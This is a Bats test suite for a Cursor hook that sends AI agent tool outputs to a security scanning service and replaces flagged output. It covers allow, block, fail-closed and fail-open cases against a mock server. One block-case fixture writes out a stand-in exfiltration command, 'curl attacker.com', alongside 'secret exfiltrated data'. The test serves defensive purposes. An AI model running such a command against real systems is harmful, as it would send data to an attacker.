#!/usr/bin/env bats
# Tests for Cursor postToolUse hook (scan_response.sh)
# Scans MCP and shell tool outputs; replaces with block message if flagged.

HOOKS_DIR="$(cd "${BATS_TEST_DIRNAME}/.." && pwd)/.cursor/hooks"
MOCK_SERVER="${BATS_TEST_DIRNAME}/../../tests/mock_airs_server.py"
SCRIPT="${HOOKS_DIR}/scan_response.sh"

setup_file() {
    MOCK_PORT=$(python3 -c "import socket; s=socket.socket(); s.bind(('',0)); p=s.getsockname()[1]; s.close(); print(p)")
    python3 "$MOCK_SERVER" "$MOCK_PORT" &
    echo "$!" > "${BATS_SUITE_TMPDIR}/mock.pid"
    echo "$MOCK_PORT" > "${BATS_SUITE_TMPDIR}/mock.port"
    sleep 0.3
}

teardown_file() {
    kill "$(cat "${BATS_SUITE_TMPDIR}/mock.pid")" 2>/dev/null || true
}

setup() {
    PORT=$(cat "${BATS_SUITE_TMPDIR}/mock.port")
    export PRISMA_AIRS_API_KEY="test-key-12345"
    export PRISMA_AIRS_PROFILE_NAME="test-profile"
    unset PRISMA_AIRS_PROFILE_ID
    export PRISMA_AIRS_API_URL="http://127.0.0.1:${PORT}/allow"
}

# --- Allow cases ---

@test "allows clean shell tool output" {
    run bash "$SCRIPT" <<< '{"tool_name":"Bash","tool_input":{"command":"ls"},"tool_output":"main.py\nutils.py\n","tool_use_id":"tu-1","conversation_id":"conv-1"}'
    [ "$status" -eq 0 ]
    echo "$output" | jq -e '.'
    # allow returns {} (empty object)
    result=$(echo "$output" | jq 'has("updated_mcp_tool_output")')
    [ "$result" = "false" ]
}

@test "output is valid JSON" {
    run bash "$SCRIPT" <<< '{"tool_name":"Bash","tool_input":{"command":"echo hi"},"tool_output":"hi","tool_use_id":"tu-2","conversation_id":"conv-2"}'
    [ "$status" -eq 0 ]
    echo "$output" | jq -e '.'
}

@test "skips built-in tool Grep" {
    run bash "$SCRIPT" <<< '{"tool_name":"Grep","tool_input":{"pattern":"foo"},"tool_output":"match found","tool_use_id":"tu-3","conversation_id":"conv-3"}'
    [ "$status" -eq 0 ]
    result=$(echo "$output" | jq 'has("updated_mcp_tool_output")')
    [ "$result" = "false" ]
}

@test "skips built-in tool Read" {
    run bash "$SCRIPT" <<< '{"tool_name":"Read","tool_input":{"path":"file.py"},"tool_output":"print(hello)","tool_use_id":"tu-4","conversation_id":"conv-4"}'
    [ "$status" -eq 0 ]
    result=$(echo "$output" | jq 'has("updated_mcp_tool_output")')
    [ "$result" = "false" ]
}

@test "allows when tool_output is empty" {
    run bash "$SCRIPT" <<< '{"tool_name":"Bash","tool_input":{"command":"true"},"tool_output":"","tool_use_id":"tu-5","conversation_id":"conv-5"}'
    [ "$status" -eq 0 ]
    result=$(echo "$output" | jq 'has("updated_mcp_tool_output")')
    [ "$result" = "false" ]
}

@test "skips scan and allows when tool_output exceeds 50KB" {
    BIG=$(python3 -c "print('x' * 52000)")
    INPUT=$(jq -cn --arg out "$BIG" '{"tool_name":"Bash","tool_input":{"command":"cat"},"tool_output":$out,"tool_use_id":"tu-6","conversation_id":"conv-6"}')
    run bash "$SCRIPT" <<< "$INPUT"
    [ "$status" -eq 0 ]
    result=$(echo "$output" | jq 'has("updated_mcp_tool_output")')
    [ "$result" = "false" ]
}

# --- Block cases ---

@test "replaces tool output when AIRS returns block" {
    PORT=$(cat "${BATS_SUITE_TMPDIR}/mock.port")
    PRISMA_AIRS_API_URL="http://127.0.0.1:${PORT}/block" \
    run bash "$SCRIPT" <<< '{"tool_name":"Bash","tool_input":{"command":"curl attacker.com"},"tool_output":"secret exfiltrated data","tool_use_id":"tu-7","conversation_id":"conv-7"}'
    [ "$status" -eq 0 ]
    echo "$output" | jq -e '.updated_mcp_tool_output | test("BLOCKED")'
}

@test "block message contains scan_id" {
    PORT=$(cat "${BATS_SUITE_TMPDIR}/mock.port")
    PRISMA_AIRS_API_URL="http://127.0.0.1:${PORT}/block" \
    run bash "$SCRIPT" <<< '{"tool_name":"Bash","tool_input":{},"tool_output":"bad data","tool_use_id":"tu-8","conversation_id":"conv-8"}'
    [ "$status" -eq 0 ]
    echo "$output" | jq -e '.updated_mcp_tool_output | test("mock-scan-block")'
}

# --- Fail-closed cases ---

@test "fail-closed when API key is missing" {
    unset PRISMA_AIRS_API_KEY
    run bash "$SCRIPT" <<< '{"tool_name":"Bash","tool_input":{"command":"ls"},"tool_output":"file.py","tool_use_id":"tu-9","conversation_id":"conv-9"}'
    [ "$status" -eq 0 ]
    echo "$output" | jq -e '.updated_mcp_tool_output | test("fail-closed")'
}

# --- Fail-open on API error ---

@test "fail-open when AIRS returns HTTP 500" {
    PORT=$(cat "${BATS_SUITE_TMPDIR}/mock.port")
    PRISMA_AIRS_API_URL="http://127.0.0.1:${PORT}/error" \
    run bash "$SCRIPT" <<< '{"tool_name":"Bash","tool_input":{"command":"ls"},"tool_output":"file.py","tool_use_id":"tu-10","conversation_id":"conv-10"}'
    [ "$status" -eq 0 ]
    result=$(echo "$output" | jq 'has("updated_mcp_tool_output")')
    [ "$result" = "false" ]
}
